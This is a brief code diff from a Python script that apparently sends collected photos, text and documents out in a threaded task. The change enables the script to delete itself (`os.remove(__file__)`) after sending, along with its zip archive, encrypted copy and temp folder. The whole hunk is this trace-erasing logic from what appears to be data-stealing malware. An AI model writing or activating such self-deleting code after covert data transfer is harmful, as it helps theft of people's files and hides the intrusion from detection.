@@ -2171,7 +2171,7 @@ threadedExecution(SendDataTask)
 try:
             if (sum(1 for item in datasent if item["type"] in ["photo", "text"]) == 1) and any(item["type"] == "document" for item in datasent):
                 remove_lock_file()
-                #os.remove(__file__)
+                os.remove(__file__)
             os.remove(ArchivePath)  
             shutil.rmtree(TempFolder)
             os.remove(ArchivePath.replace('.zip','.aes'))
